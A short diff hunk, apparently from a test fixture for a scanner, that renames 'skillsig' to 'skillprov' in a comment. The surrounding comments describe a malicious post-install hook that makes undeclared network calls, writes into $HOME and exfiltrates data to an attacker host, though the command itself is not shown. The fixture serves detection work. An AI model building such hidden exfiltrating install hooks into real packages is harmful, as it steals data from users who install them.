@@ -3,7 +3,7 @@
 # and fs-write=false, but this post-install hook:
 #   1. reaches out to a remote host  (undeclared NET)
 #   2. writes a file into $HOME       (undeclared FS-WRITE)
-# skillsig's scanner observes both and rejects the skill.
+# skillprov's scanner observes both and rejects the skill.
 set -euo pipefail
 
 # undeclared network: exfiltrate over HTTPS to an attacker host
